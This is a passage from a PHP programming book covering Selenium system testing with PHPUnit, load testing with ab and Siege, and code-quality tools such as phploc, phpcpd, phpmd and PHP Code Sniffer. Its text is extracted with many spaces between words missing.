thedatabase with thedata setreturned bygetDataSet() .Thetestmethod then ex-
ecutes code being tested toperform operations against thedatabase. Afterward, it
performs anyassertions necessary toverify thattheoperations hadtheintended
effect, such aschanging thenumber ofrows ordata contained inrows ofoneor
more tables.
Systems T esting
Once theindividual components ofasystem andtheir interactions with external
systems have been tested, theapplication asawhole should betested too.This is
referred toassystems testing .Inthecase ofweb applications, thisistypically done
bywriting automated tests thatinteract with abrowser inthesame waythatahuman
user would.
Apopular software package forwriting andexecuting such tests isSelenium,37a
Java-based server thatallows clients toconnect toitandexecute commands to
launch andinteract with web browsers. Themore common useforthissoftware is
toexecute asequence ofactions within aweb application, andthen make assertions
about thecontents ofthelastloaded document toconfirm it’sfunctioning asinten-
ded.
PHPUnit includes aSelenium extension thatallows these interactions tobeper-
formed. Code examples intheremainder ofthissection will usethisextension to
show what client-side Selenium logic looks like. Youcanrefer totheinstallation
documentation foreither Selenium Server38orSelenium RC39toinstall theserver
component prior towriting client tests.
37http://seleniumhq.org/
38http://seleniumhq.org/docs/03_webdriver .html#setting-up-a-selenium-webdriver -project
39http://seleniumhq.org/docs/05_selenium_rc.html#installationPHP Master: W rite Cutting-edge Code 270
www.it-ebooks.info
Initial Setup
Like theDatabase extension, theSelenium extension forPHPUnit provides itsown
base testcase andassertions. Let’slook atasimple example:
chapter_07/tests/BaseSeleniumT estCase.php  (excerpt)
abstract class My_BaseSeleniumTestCase extends ➥
  PHPUnit_Extensions_SeleniumTestCase
{
  protected function setUp()
  {
    $this->setHost('localhost');
    $this->setPort(4444);
    $this->setBrowser('*firefox');
    $this->setBrowserUrl('http://example.com');
    $this->setTimeout(5000);
  }
}
setHost() andsetPort() refer tothehost andport onwhich theSelenium server
isrunning. Thevalues passed tothem inthisexample arethedefault values; expli-
citly calling these methods with these values isunnecessary .Themethod calls are
merely shown here fordemonstration purposes.
setBrowser() specifies theweb browser tolaunch. Oddly ,theSelenium manual
omits alistofsupported browser strings, butonecanbefound inthesource code.40
It’salso possible tospecify thepath toabrowser executable,41which isuseful on
systems running multiple versions ofthesame browser orabrowser thatSelenium
doesn’t officially support, andtospecify multiple browsers42with different values
fortheparameters setinthepreceding example.
setBrowserUrl() hasaslightly misleading name. Itactually setsabase URL that
isautomatically prefixed toallrelative URL values subsequently passed tothe
open() method, which simulates auser entering aURL into theaddress bar.Using
thevalue passed tosetBrowserUrl() intheabove example, calling$this-
40http://svn.openqa.org/fisheye/browse/selenium-rc/trunk/server -coreless/src/main/java/org/openqa/sel-
enium/server/browserlaunchers/BrowserLauncherFactory .java?r=trunk
41http://seleniumhq.org/docs/05_selenium_rc.html#specifying-the-path-to-a-specific-browser
42http://www .phpunit.de/manual/current/en/selenium.html#selenium.seleniumtestcase.ex-
amples.W ebTest3.php271 Automated T esting
www.it-ebooks.info
>open('/index.php') would open theURL http://example.com/index.php .(Note
thatopen() also accepts absolute URLs.)
setTimeout() isused tosetatimeout fortheinitial connection totheSelenium
server .Itreceives aninteger representing inmilliseconds theamount oftime to
wait. Theabove example uses atimeout of5,000 milliseconds, orfiveseconds.
It’sagood practice toestablish your own base testcase perproject. This allows
custom assertions andother methods containing commonly used logic tobemade
available toallother testcases intheproject.
Commands
Theimplementation ofcommands isunfortunately notquite asstraightforward as
themethods used intheinitial setup. This isanimportant area tounderstand as
youbegin writing tests. Toexplain it,let’slook atwhat happens when acommand
isissued:
chapter_07/tests/FooSeleniumT estCase.php  (excerpt)
class My_FooSeleniumTestCase extends My_BaseSeleniumTestCase
{
  protected function setUp()
  {
    $this->open('/foo');
    
    // ⋮
  }
}
PHPUnit_Extensions_SeleniumTestCase neither declares norinherits animple-
mentation foropen() .However ,itdoes have a__call() implementation, soPHP
implicitly executes thatandpasses itthename ofthemethod andtheparameters
passed intheoriginal method call.
__call() proxies toaninstance ofPHPUnit_Extensions_SeleniumTestCase_Driver .
Like thetestcase, thedriver doesn’t declare orinherit animplementation foropen() ,
anddoes implement __call() ,sothemethod callisresolved tothat.PHP Master: W rite Cutting-edge Code 272
www.it-ebooks.info
Atthispoint, themethod callisinterpreted andanycorresponding commands are
sent totheSelenium server .Inappropriate situations, aserver response isprocessed
andareturn value issent back tothecode thatmade theoriginal method call.
TheDocBlocks ofboth__call() implementations include alistofsupported
commands. Additionally ,theSelenium website contains areference fortheRC
protocol43thatfurther explains what commands andassertions do,what parameters
they accept, andwhat values they return.
Locators
Inorder tointeract with document elements orassert their presence orabsence,
youneed awaytospecify which elements you’re interested in.This isaccomplished
with locators ,ageneral term used inSelenium documentation torefer toanyex-
pression used toidentify anelement. When thedocumentation foracommand ref-
erences alocator parameter ,thisiswhat they’re referring to.Locator expressions
areformatted likeso:
locatorType=argument 
While limiting theexpression toonly theargument value isallowed, it’susually
besttoinclude thelocator type rather than leave Selenium toguess. Though Selen-
iumsupports other locator types, thetypes most commonly used inorder from best-
toworst-performing areidentifier ,CSS selector ,andXPath expression.
Thelocator type foridentifier expressions isidentifier .Selenium evaluates this
type ofexpression byfirst searching thecurrent document foranelement where
theidattribute value matches thesupplied argument. Ifthatfails tomatch any
elements, Selenium then repeats thesearch with thename attribute instead ofthe
idattribute. idandname canalso beused aslocator types tolimit searches totheir
respective attributes only.
CSS selectors usethelocator type css.Ifyou’ve ever worked with stylesheets fora
markup document orworked with aJavaScript library likejQuery ,you’re probably
already familiar with CSS selectors. Selenium supports both CSS244andCSS3 se-
43http://release.seleniumhq.org/selenium-core/1.0.1/reference.html
44http://www .w3.org/TR/REC-CSS2/selector .html273 Automated T esting
www.it-ebooks.info
lectors.45While theW3C specs arethemost comprehensive references, they are
alsofairly dryandacademic intone. ThejQuery documentation46provides excellent
explanations ofselectors with accompanying visual examples.
Thexpath locator type isassociated with XPath expressions, which correspond to
astandard47used forsearching XML-compatible documents, similarly tohow reg-
ularexpressions areused tosearch forpatterns instrings. XPath isoneoftheslower
locator types48and, assuch, should beavoided where possible. Most XPath expres-
sions canberewritten asCSS selectors. Ifyour circumstances demand thatyouuse
XPath andyour familiarity with itislimited, there’ sanexcellent tutorial byTobias
Schlitt andJakob Westhoff onthesubject.49
It’snotuncommon forthesame locator expression tobeused multiple times inthe
testsuite foranapplication. Assuch, it’sgood practice toestablish semantically
meaningful names forexpressions, store them inacentral location such asaPHP
filethatreturns anassociative array ,andreference them byname wherever they
areneeded. This prevents duplication ofexpressions insource code andincreases
maintainability .Thesame principle applies torelative URLs andsimilar parameters
ofSelenium commands.
Assertions
PHPUnit_Extensions_SeleniumTestCase does provide some assertions,50butnot
allavailable assertions areexplicitly declared there. Recall thatthisclass proxies
commands toadriver instance, which inturn handles them inits__call() imple-
mentation. Ifyouview thesource code forthis, you’ll find alineresembling the
following:
case isset(self::$autoGeneratedCommands[$command]): { 
Thedriver class constructor executes amethod calledautoGenerateCommands() .
Foreach supported get*() oris*() method listed intheDocBlock ofthetestcase
45http://www .w3.org/TR/2001/CR-css3-selectors-20011113/
46http://api.jquery .com/category/selectors/
47http://www .w3.org/TR/xpath/
48http://saucelabs.com/blog/index.php/2011/01/selenium-xpath-marks-the-spot/
49http://schlitt.info/opensource/blog/0704_xpath.html
50http://www .phpunit.de/manual/current/en/selenium.html#selenium.seleniumtestcase.tables.assertionsPHP Master: W rite Cutting-edge Code 274
www.it-ebooks.info
anddriver__call() implementations, autoGenerateCommands() creates entries in
the$autoGeneratedCommands property forcorresponding assert*() and
assertNot*() methods.
Asanexample, onesupported command method isgetTitle() .Thecorresponding
assertion methods forthismethod areassertTitle() andassertNotTitle() .Both
accept anexpected value forthetitle, execute thegetTitle() method internally
fortheactual value, andperform astandard equal orunequal assertion tocompare
thetwo; they simply provide aconvenient shorthand. Forcomparison logic other
than simple equality ,consider using theglob, regexp, orregexpi pattern syntaxes.51
One notable trait ofassertions isthatthey’re applied tothedocument’ spresent
state. That is,even iftheassertion would pass when performed onthedocument’ s
state afraction ofasecond from now,itwill failifitdoesn’t pass now.Methods
likewaitForPageToLoad() will terminate when themarkup forapage isreturned
orthesupplied timeout isreached. Ifanassertion isperformed tocheck fordynamic
content resulting from client-side code making anadditional request, theassertion
may failiftheserver takes toolong tofulfill thatrequest.
Tofillthisneed,waitFor*() andwaitForNot*() methods arealsosupported. These
execute their corresponding assert*() methods once persecond until either the
assertion passes orthetimeout specified bythedriver’ s$httpTimeout property is
reached (which canbesetusing itssetHttpTimeout() method). Themain disad-
vantage tousing these isthatthesecond delay isn’t configurable andcanaddup
quickly ifyouhave alotoftests. Insuch cases, itmay make sense towrite your
own version.
Database Integr ation
System tests fordatabase-driven applications often require theability toputthe
database inaspecific state before atestbegins, asdatabase tests do.However ,because
system tests have their own base class inPHPUnit, implementing database seeding
can’t bedone byextending thedatabase testcase.
Instead, related logic must bemoved into aseparate class thatcanbeinvoked from
both types oftestcases. Luckily ,theDatabase extension provides abasis forsuch
aclass. Let’slook atanexample ofusing thisclass:
51http://release.seleniumhq.org/selenium-core/1.0.1/reference.html#patterns275 Automated T esting
www.it-ebooks.info
chapter_07/tests/DatabaseT ester .php
class My_DatabaseTester extends ➥
  PHPUnit_Extensions_Database_AbstractTester
{
  /**
   * @return PHPUnit_Extensions_Database_DB_IDatabaseConnection
   */
  public function getConnection()
  {
    $pdo = new PDO('mysql:...');
    return $this->createDefaultDBConnection($pdo, 'database_name');
  }
  /**
   * @return PHPUnit_Extensions_Database_DataSet_IDataSet
   */
  public function getDataSet()
  {
    return $this->createFlatXMLDataSet(dirname(__FILE__) . ➥
      '/_files/seed.xml');
  }
}
Ifthemethods inthisclass look familiar ,they should: they’re identical tomethods
from thebase database testcase example shown earlier .What thisbase class provides
iscode thatuses these methods toperform thesame operations onthedatabase that
thebase database testcase does initssetUp() andtearDown() implementations.
Inorder todoso,however ,itrequires thatcorresponding methods becalled atap-
propriate points inyour system testcase, asinthisexample:
chapter_07/tests/FooSeleniumT estCase.php  (excerpt)
class My_FooSeleniumTestCase extends My_BaseSeleniumTestCase
{
  protected $databaseTester;
  protected function setUp()
  {
    parent::setUp();
    $this->databaseTester = new My_DatabaseTester();
    $this->databaseTester->onSetUp();
  }PHP Master: W rite Cutting-edge Code 276
www.it-ebooks.info
  protected function tearDown()
  {
    parent::tearDown();
    $this->databaseTester->onTearDown();
  }
}
TheonSetUp() callhandles clearing thedatabase ofdata andreseeding it.The
onTearDown() calldoes nothing bydefault. These canbeconfigured using the
setSetUpOperation() andsetTearDownOperation() methods implemented in
PHPUnit_Extensions_Database_AbstractTester ,either from thesystem testcase
orthedatabase tester constructor .Forappropriate values topass tothese methods,
examine thereturn values ofmethods inthe
PHPUnit_Extensions_Database_Operation_Factory class.
Debugging
Because aSelenium testterminates assoon asanassertion fails andtakes theentire
browser session with it,debugging output isextremely helpful inlocating thecause.
TheSelenium extension offers afewdifferent sources ofsuch information.
One source isscreenshots. Depending onthenature oftheissue, ascreenshot may
expose thecause immediately without requiring youtotediously comb through
markup. Toenable automatic creation ofscreenshots when atestfails, setallthe
following properties inyour testcase:
chapter_07/tests/FooSeleniumT estCase.php  (excerpt)
class My_FooSeleniumTestCase extends My_BaseSeleniumTestCase
{
  protected $captureScreenshotOnFailure = TRUE;
  protected $screenshotPath = '/var/www/htdocs/screenshots';
  protected $screenshotUrl = 'http://localhost/screenshots';
  
  // ⋮
}
Screenshots canbetoggled onoroffusing the$captureScreenshotOnFailure flag.
Note thatthisonly causes them tobetaken when anassertion fails.$screenshotPath
specifies adirectory where screenshot files aretobestored inPNG format using
names corresponding totestmethods inwhich theassertion failures occurred. Fi-277 Automated T esting
www.it-ebooks.info
nally ,$screenshotUrl canbeused tospecify anaccessible base directory orURL
atwhich thescreenshot files will beaccessible.
Note thatitispossible tomanually create ascreenshot even when afailure hasn’t
occurred. Takealook attheonNotSuccessfulTest() method ofthe
PHPUnit_Extensions_SeleniumTestCase class toseehow it’sdone automatically .
Sometimes, ascreenshot will failtoreveal theproblem andmore information will
berequired. Atthispoint, theHTML source ofthepage being viewed may be
helpful. Ifyouwant tohave your testcases always dump thesource toafilewhen
atestfails, youcould dothis:
chapter_07/tests/BaseSeleniumT estCase.php  (excerpt)
class My_BaseSeleniumTestCase extends ➥
  PHPUnit_Extensions_SeleniumTestCase
{
  protected $htmlSourcePath = '/var/www/htdocs/source';
  // ⋮
  protected function onNotSuccessfulTest(Exception $e)
  {
    parent::onNotSuccessfulTest($e);
    $path = $this->htmlSourcePath . DIRECTORY_SEPARATOR . 
      $this->testId . '.html';
    file_put_contents($path, $this->getHtmlSource());
    echo 'Source: ', $path, PHP_EOL;
  }
}
It’spossible togenerate coverage reports forcode being executed bySelenium tests
justaswith unittests. Todothis, copy somewhere within your webserver document
root directory PHPUnit/Extensions/SeleniumT estCase/phpunit_coverage.php .Inyour
php.ini file,setauto_prepend_file andauto_append_file toabsolute paths for
PHPUnit/Extensions/SeleniumT estCase/prepend.php and
PHPUnit/Extensions/SeleniumT estCase/append.php ,respectively .Inyour testcase, add
thisproperty andadjust itsvalue according toyour web server’ shost name andthe
path towhich you’ve copied phpunit_coverage.php :
protected $coverageScriptUrl = 'http://localhost/ ➥
  phpunit_coverage.php';PHP Master: W rite Cutting-edge Code 278
www.it-ebooks.info
Automating Writing T ests
Thegoal ofsystem tests istoperform tasks within anactual application asanactual
user might, inorder toconfirm thattheapplication conforms toexpected behavior .
Youmight conclude thattheactofwriting tests itself could beexpedited byahuman
performing these tasks manually onetime andthecomputer converting those actions
into actual PHP testcode. And youwould becorrect.
When using Selenium forsystem testing, themethod ofwriting tests that’sgenerally
most efficient involves using Selenium IDE, aplugin fortheMozilla Firefox web
browser; itprovides anentire integration development environment forrecording,
changing, running, debugging, andgenerating code forSelenium tests. Inaddition,
it’safeasible way foreven nondevelopers with some level oftechnical skill tocreate
testcases thatcanbeused togenerate initial code, which developers canlater
supplement manually .
TheSelenium IDEdocumentation52isafairly comprehensive resource onhow to
install anduseit.Once tests arecomposed andcode forthem isgenerated, thein-
formation inthissection canbeused toaddlogic notsupported bySelenium IDE,
such asthatfordatabase integration. Inshort, Selenium IDEcannegate asignificant
portion oftheinitial overhead involved inwriting system tests byautomating the
creation ofcode, andthus ease thelearning curve ofwriting testcode manually .
Load T esting
Once anapplication isworking correctly ,both interms ofitsindividual components
andasawhole, it’shelpful toknow how thatapplication performs asawhole. Load
testing involves simulating activity foragroup ofusers todetermine how well the
application performs under theload.
This information canbeuseful intwomajor ways. First, ifyouhave specific expect-
ations fortheload anapplication willneed tohandle when it’sdeployed toproduc-
tion, load testing canprovide arough estimate ofhow much server hardware will
berequired. Second, while anapplication isbeing developed ormaintained, load
testing canexpose changes thatmay significantly impact performance, especially
52http://seleniumhq.org/docs/02_selenium_ide.html279 Automated T esting
www.it-ebooks.info
ifautomated load tests areincluded inacontinuous integration environment—that
is,arepeated series ofquality control processes.
Theremainder ofthissection will review available tools forperforming load tests,
including how tointerpret their output, andprovide some associated resources.
Forfurther information onthese topics, refer totheexcellent benchmark blog post
series written byPaul Jones.53
ab
ab54isarelatively simple benchmarking tooldeveloped aspartoftheApache HTTP
server project, andisavailable inmost environments with Apache installed. While
ithasanumber ofparameters with which totweak how itconducts itstests, three
inparticular areused frequently:
1.-c # :number ofconcurrent requests tomake persecond, orthenumber ofusers
accessing theapplication simultaneously
2.-n # :number ofrequests tosend
3.-t #:maximum amount oftime inseconds tocontinue testing, assumes-n 50000
So,forexample, ifyouwanted tosimulate siteactivity with 10concurrent users
foroneminute, thecommand tousewould be:
ab -c 10 -t 60 http://localhost/phpinfo.php
abhasafairbitofoutput, butthisblock ismost frequently ofinterest:
Concurrency Level:      10 
Time taken for tests:   60.003 seconds 
Complete requests:      20238 
Failed requests:        0 
Write errors:           0 
Total transferred:      1502270841 bytes 
HTML transferred:       1498403855 bytes 
Requests per second:    337.29 [#/sec] (mean) 
Time per request:       29.648 [ms] (mean) 
53http://paul-m-jones.com/category/programming/benchmarks
54http://httpd.apache.org/docs/2.2/programs/ab.htmlPHP Master: W rite Cutting-edge Code 280
www.it-ebooks.info
Time per request:       2.965 [ms] (mean, across all concurrent ➥
  requests) 
Transfer rate:          24449.97 [Kbytes/sec] received 
Thetwobold lines inparticular areimportant. Requests per second ,sometimes
abbreviated torps,isthemain metric forload testing. Itsincrease implies thatap-
plication performance hasbeen improved, andvice versa. Ifyour application is
working asexpected, Failed requests exceeding zero generally implies thatthe
application isunable tohandle theload used forthetestonthehardware hosting
it.Ifanapplication request fails tobefulfilled within acertain amount oftime, the
client will terminate therequest from their endanditwill becounted asfailed.
Thus, thehighest value ofRequests per second forwhichFailed requests donot
exceed zero istheapplication’ smaximum load onthathardware.
Siege
Another commonly used load testing toolisSiege,55which isdeveloped byJoeDog
Software. Whereabislimited totesting load ononespecific URL, Siege isuseful
fortesting load onanentire application, inaddition tothatURL. TheSiege manual56
describes theoptions itsupports, buthere areafewofthemore useful ones:
■-u [url] :asingle URL toload test
■-f [file] :path toafilecontaining oneormore URLs (one perline) toload test
■-i:internet mode, which simulates users hitting random URLs from thefile
specified with-f
■-c # :number ofconcurrent users
■-r # :number ofrequests tobesent peruser
■-t #[SMH] :maximum amount oftime tocontinue testing inseconds, minutes,
orhours asdenoted byincluding S,M,orH,respectively ,after thequantity
■-d # :time inseconds between requests peruser,defaulting to3;it’srecommen-
dedtouse1forbenchmarking
55http://www .joedog.org/index/siege-home
56http://www .joedog.org/index/siege-manual281 Automated T esting
www.it-ebooks.info
■-l [file] :logstheoutput from siege toafile,appending toitifitalready exists
■-v:verbose mode, which includes theHTTP protocol version, response code,
andURL foreach request
One handy aspect ofSiege isthatthedefault values ofitsoptions canbechanged
with aconfiguration file.This defaults to.sieger cinyour user directory ,which can
begenerated using thesiege.config utility ifitdoesn’t exist. Thestock .sieger cfile
includes extensive comments explaining each option. Afilewith adifferent path
canbespecified using the-Coption.
Theequivalent Siege command fortheearlierabexample using 10concurrent users
andrunning foroneminute isthis:
siege -c 10 -t 60S -d 1 http://localhost/phpinfo.php
Thecorresponding output resembles thefollowing:
** SIEGE 2.69 
** Preparing 10 concurrent users for battle. 
The server is now under siege... 
Lifting the server siege...   done. 
Transactions:                 1138 hits 
Availability:                 100.00 % 
Elapsed time:                 59.31 secs 
Data transferred:             12.88 MB 
Response time:                0.01 secs 
Transaction rate:     19.19 trans/sec
Throughput:                   0.22 MB/sec 
Concurrency:                  0.19 
Successful transactions:      1138 
Failed transactions:  0
Longest transaction:          0.06 
Shortest transaction:         0.00 
Again, thebold rows arethemost commonly referenced. Transaction rate denotes
thenumber ofrequests persecond andFailed transactions denotes thenumber
ofrequests thatfailed; both have thesame significance astheir counterparts inthe
aboutput.PHP Master: W rite Cutting-edge Code 282
www.it-ebooks.info
Tried and T ested
This chapter hascovered several testing scenarios inPHP,including testing:
■individual components with unit testing andbehavioral testing
■integration with adata source using database testing
■anentire application using systems testing
■theusage capacity ofanapplication using load testing
Used incombination, these techniques should make youfeelconfident inthe
quality andcapability ofanapplication prior todeploying it.
Ofcourse, aninitial outlay isrequired inorder todevelop tests, nottomention the
long-term investment tomaintain them alongside code-testing. However ,thetrue
value isinyour ability tocontinually runtesting over time, sothatyou’re safein
theknowledge thatexpected andactual behaviors areconsistent. Youmay even
liketoconsider implementing acontinuous integration solution, sothattheprocess
ofrepeatedly running tests isautomated, andthattestfailures arediscovered early
indevelopment.283 Automated T esting
www.it-ebooks.info
www.it-ebooks.info
Chapter8
Quality Assur ance
This chapter follows onquite naturally from automated testing, theprevious chapter .
Here, we’ll look atsome ofthetools thatensure ourprojects areofahigh standard.
These include using source control tomanage collaboration andproject evolution,
andhaving automated deployment systems thatcanputcode livewithout forgetting
anything—unlike anormal person. We’llalso take alook athow wecanmeasure
ourcode, making sure thatit’sconsistent andwell-formed, andhow togenerate
documentation from it.
These aretheingredients ofawell-tooled project process, where wespend aslittle
time aspossible onthemechanics, andasmuch time aspossible building ourinter -
esting andsuccessful application.
Measuring Quality with Static Analysis T ools
Static analysis isthemeasuring ofcode without running it.Thetools evaluate the
code asitis,reading thefiles andmeasuring elements ofitasit’swritten. There are
many tools outthere and, luckily forus,thebest PHP ones areallfreely available.
Using these tools, wecankeep ahigh-level picture ofhow ourcodebase islooking,
www.it-ebooks.info
even asthatcodebase (orselection ofcodebases) becomes increasingly large and
complex.
Static analysis tools areakeyingredient inourproject process, butthey areonly
really valuable when werunthem regularly ,ideally with every commit. Thetools
cover allkinds ofaspects ofourcode, from counting classes andlines, toidentifying
where there aresimilar segments ofcode thatsuggest copying andpasting hastaken
place! Then, we’ll look athow static analysis tools canhelp uswith twoparticularly
crucial issues incode quality: coding standards anddocumentation.
Allthetools inthissection areavailable through PEAR—see Appendix Aforhow
toinstall tools using thispackage management approach. Youmay also find that
many ofthese tools areavailable through thepackage manager onyour OS(for*nix-
based systems). Feel freetousethisapproach, butbear inmind thatinmany cases
they won’t bethecurrent versions ofthetools.
phploc
PHP Lines ofCode (phploc) might notsound likeavery interesting static analysis
tool, butitdoes give some interesting information, especially when it’srunre-
peatedly over time. Itgives information about thetopology oftheproject aswell as
thesize. Here’ swhat happens when weuseitonastandard WordPress version:
$ phploc wordpress/
phploc 1.6.1 by Sebastian Bergmann.
Directories:                                         26
Files:                                              380
Lines of Code (LOC):                             171170
  Cyclomatic Complexity / Lines of Code:           0.19
Comment Lines of Code (CLOC):                     53521
Non-Comment Lines of Code (NCLOC):               117649
Namespaces:                                           0
Interfaces:                                           0
Classes:                                            190
  Abstract:                                           0 (0.00%)
  Concrete:                                         190 (100.00%)
  Average Class Length (NCLOC):                     262
Methods:                                           1990PHP Master: W rite Cutting-edge Code 286
www.it-ebooks.info
  Scope:
    Non-Static:                                    1986 (99.80%)
    Static:                                           4 (0.20%)
  Visibility:
    Public:                                        1966 (98.79%)
    Non-Public:                                      24 (1.21%)
  Average Method Length (NCLOC):                     25
  Cyclomatic Complexity / Number of Methods:       5.56
Anonymous Functions:                                  0
Functions:                                         2330
Constants:                                          351
  Global constants:                                 348
  Class constants:                                    3
This isalotofcode, andWordPress hasbeen around along time, sothere’ slittle
useofPHP 5features. phploc isagreat toolforgetting afeelforhow biganunfamil-
iarcodebase is,orforfollowing how ourown codebases aregrowing andchanging
over time. Tousephploc, simply useacommand likethis:
phploc wordpress/
Itwillgiveoutput similar tothatshown above, andcanalsowrite output indifferent
formats; forexample, XML tobeused byacontinuous integration system.
Cyclomatic Complexity
This isameasure of,inlayterms, how many paths there arethrough afunction—or
how complex itis—and isrelated tohow many tests would beneeded toproperly
cover thiscode. Ingeneral, avery high score strongly indicates thatthecode would
benefit from refactoring tocreate more, shorter methods—which will beeasier to
test.
phpcpd
ThePHP Copy Paste detector (phpcpd) isatoolthatlooks forsimilar patterns in
code, with theaimofidentifying where code hasbeen copied andpasted around
thecodebase. This isauseful tooltoinclude inaregular build process, buttheright
numbers toachieve intheoutput will vary from project toproject. We’llusethe287 Quality Assur ance
www.it-ebooks.info
WordPress codebase again forourexample, purely because it’sawell-known open
source project:
$ phpcpd wordpress/
phpcpd 1.3.2 by Sebastian Bergmann.
Found 33 exact clones with 562 duplicated lines in 14 files:
  - wp-admin/includes/update-core.php:482-500
    wp-admin/includes/file.php:733-751
  - wp-admin/includes/class-wp-filesystem-ssh2.php:346-365
    wp-admin/includes/class-wp-filesystem-direct.php:326-345
 ⋮
  - wp-includes/class-simplepie.php:10874-10886
    wp-includes/class-simplepie.php:13185-13197
  - wp-content/plugins/akismet/admin.php:488-500
    wp-content/plugins/akismet/admin.php:537-549
  - wp-content/plugins/akismet/legacy.php:234-248
    wp-content/plugins/akismet/legacy.php:301-315
0.33% duplicated lines out of 171170 total lines of code.
Time: 6 seconds, Memory: 154.50Mb
This isparticularly useful totrack over time; once again, thetooliscapable ofout-
putting inanXML file,which will beunderstood byacontinuous integration tool,
sowecaneasily include thisinourbuild scripts andhave theinformation added
toagraph over time. Looking into new instances ofcode thataresimilar isanice
way tocatch these copy/paste situations anddiscuss ways inwhich thecode could
bereused. Bear inmind, though, thatsometimes itjustisn’t possible orsensible to
reuse code; soalthough it’salways worth considering theoptions, it’sunhelpful to
implement azero tolerance forcode thatispicked upbythistool.
phpmd
ThePHP Project Mess Detector (phpmd) isatoolthatattempts toquantify what an
experienced developer would call“code smells.” Ituses aseries ofmetrics tofindPHP Master: W rite Cutting-edge Code 288
www.it-ebooks.info
elements ofaproject which seem outofkilter .This toolgenerates alotofoutput,
butmost ofitisgood advice; here’ sasnippet resulting from asking ittocheck for
naming messes inWordPress:
$ phpmd wordpress/ text naming
/home/lorna/downloads/wordpress/wp-includes/widgets.php:32
/home/lorna/downloads/wordpress/wp-includes/widgets.php:76
/home/lorna/downloads/wordpress/wp-includes/widgets.php:189
/home/lorna/downloads/wordpress/wp-includes/widgets.php:319
/home/lorna/downloads/wordpress/wp-includes/widgets.php:333I
/home/lorna/downloads/wordpress/wp-includes/widgets.php:478
/home/lorna/downloads/wordpress/wp-includes/widgets.php:496
Avoid variables with short names like$id.
Classes shouldn’t have aconstructor method with thesame name astheclass.
Avoid excessively long variable names like$wp_registered_widgets .
Classes shouldn’t have aconstructor method with thesame name astheclass.
Avoid excessively long variable names like$wp_registered_widgets .
Avoid excessively long variable names like$wp_registered_sidebars .
Avoid extremely short variable names like$n.
Again, it’squite likely thatevery project would have some output from atoollike
this, butitisvery useful tousephpmd tohelp identify trends. There’ sacomment
here [2]thattheconstructor shouldn’t have thesame name astheclass—but for
WordPress, which wasPHP 4-compliant until recently ,we’d expect toseethis
backwards-compatible style. There areother rules included, covering items like
code sizemetrics, design elements (picking upuses ofeval() ,forexample), and
also identifying unused code.
Allthese static analysis tools areavailable tohelp usbetter understand thescope
andshape ofourcodebases, andcanshow usareas towork on.Inthenext section,
we’ll look athow wecancheck thatourcode adheres toacoding standard.289 Quality Assur ance
www.it-ebooks.info
Coding Standar ds
Coding standards isatopic ofheated debate inmany development teams. Since the
indentation anduseofspace makes nodifference tohow thecode isexecuted, why
dowecare about making rules about formatting andadhering tothem? Intruth,
we’ve become accustomed toonecoding style oranother ,andwhen code islaid
outinaway thatweexpect, itbecomes much easier toread.
Itcanbetricky tokeep everything laidoutexactly asitshould be.Youread the
guidelines ontheproject wiki foryour new team, butonce yougetyour teeth into
solving aparticular problem, yousoon forget which bracket issupposed togowhere.
Thefirsttactic forusing thecorrect format istosetupyour editor forelements like
lineendings, whether tabs orspaces should beused, andifspaces, how many .The
second istouseatoollikePHP Code Sniffer tocheck allcode.
Checking Coding Standar ds with PHP Code Sniffer
First, you’ll need toinstall thistoolonto your server .Whether it’sonyour develop-
ment machine orabuild server will depend entirely ontheresources youhave
available. PHP Code Sniffer1isavailable from PEAR; refer toAppendix Aon
working with PEAR formore information about installing it.Many Linux distribu-
tions also offer PHP Code Sniffer asapackage.
Using PHP Code Sniffer for JavaScript and CSS
Ifyouhave JavaScript orCSS files inyour projects, PHP Code Sniffer canalso
check thatthese conform totheappropriate standards forthose formats.
Once youhave thetoolinstalled, youcancheck your code with it.We’llillustrate
thiswith avery simple example class, asshown here:
class Robot {
    protected $x = 0;
    protected $y = 0;
    public function getCatchPhrase() {
        return 'Here I am, brain the size of ...';
1http://pear .php.net/package/PHP_CodeSniffer/PHP Master: W rite Cutting-edge Code 290
www.it-ebooks.info
    }
    public function Dance() {
        $xmove = rand(-2, 2);
        $ymove = rand(-2, 2);
        if($xmove != 0) {
            $this->x += $xmove;
        }
        if($ymove != 0) {
            $this->y += $ymove;
        }
        return true;
    }
}
This alllooks fairly standard, right? Well,let’sseewhat happens when werunPHP
Code Sniffer over it.We’llusethePEAR standard forthisexample:
phpcs --standard=PEAR robot.php 
FILE: /home/lorna/data/personal/books/Sitepoint/PHPPro/qa/code/ ➥
  robot.php
--------------------------------------------------------------
FOUND 10 ERROR(S) AND 0 WARNING(S) AFFECTING 6 LINE(S)
--------------------------------------------------------------
  2 | ERROR | Missing file doc comment
  4 | ERROR | Opening brace of a class must be on the line after ➥
                the definition
  4 | ERROR | You must use "/**" style comments for a class comment
  8 | ERROR | Missing function doc comment
  8 | ERROR | Opening brace should be on a new line
 12 | ERROR | Public method name "Robot::Dance" is not in camel ➥
                caps format
 12 | ERROR | Missing function doc comment
 12 | ERROR | Opening brace should be on a new line
 15 | ERROR | Expected "if (...) {\n"; found "if(...) {\n"
 18 | ERROR | Expected "if (...) {\n"; found "if(...) {\n"
---------------------------------------------------------------
Asyoucansee,we’ve ended upwith 10errors, which isabignumber forafilethat
wasonly 20lines long tostart with. Look closer ,though, andyou’ll seesome ofthe
same output coming upmore than once. Thecomplaints arearound missing com-291 Quality Assur ance
www.it-ebooks.info
ments, bracket positions, andtheabsent space after theif() statements. Wecan
amend ourcode tofixthese issues:
/**
 * Robot 
 * 
 * PHP Version 5
 * 
 * @category  Example
 * @package   Example
 * @author    Lorna Mitchell <lorna@lornajane.net> 
 * @copyright 2011 Sitepoint.com
 * @license   PHP Version 3.0 {@link http://www.php.net/license/ ➥
                3_0.txt}
 * @link      http://sitepoint.com
 */
class Robot
{
    protected $x = 0;
    protected $y = 0;
    public function getCatchPhrase() 
    {
        return 'Here I am, brain the size of ...';
    }
    public function dance() 
    {
        $xmove = rand(-2, 2);
        $ymove = rand(-2, 2);
        if ($xmove != 0) {
            $this->x += $xmove;
        }
        if ($ymove != 0) {
            $this->y += $ymove;
        }
        return true;
    }
}
Ifwerunthesame command again, weseethatmost oftheobjections have now
been taken care of.Infact, theonly missing elements arethecomment blocks for
thefileandforthetwofunctions. Since we’re going tolook atinline documentation
later inthischapter ,we’ll leave those outfornow.PHP Master: W rite Cutting-edge Code 292
www.it-ebooks.info
Viewing Coding Standar ds Violations
PHP Code Sniffer hasacouple ofgreat reporting styles thatyoucanusetoseethe
“big picture” ofthecodebase you’re working on.These canbeoutput tothescreen
